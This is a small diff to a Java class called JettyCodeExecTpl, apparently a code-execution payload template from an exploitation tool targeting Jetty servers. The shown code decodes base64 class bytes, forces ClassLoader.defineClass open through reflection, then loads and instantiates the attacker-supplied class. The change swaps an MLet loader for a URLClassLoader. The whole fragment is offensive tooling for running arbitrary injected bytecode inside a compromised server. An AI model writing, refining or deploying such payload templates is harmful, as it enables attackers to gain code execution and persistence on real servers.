@@ -79,7 +79,7 @@ public class JettyCodeExecTpl {
             byte[] clazzByte = base64Decode(var2);
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
-            Class clazz = (Class) defineClass.invoke(new javax.management.loading.MLet(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), clazzByte, 0, clazzByte.length);
+            Class clazz = (Class) defineClass.invoke(new java.net.URLClassLoader(new java.net.URL[0], java.lang.Thread.currentThread().getContextClassLoader()), clazzByte, 0, clazzByte.length);
             return clazz.newInstance().toString();
         } catch (Exception e) {
             return e.getMessage();
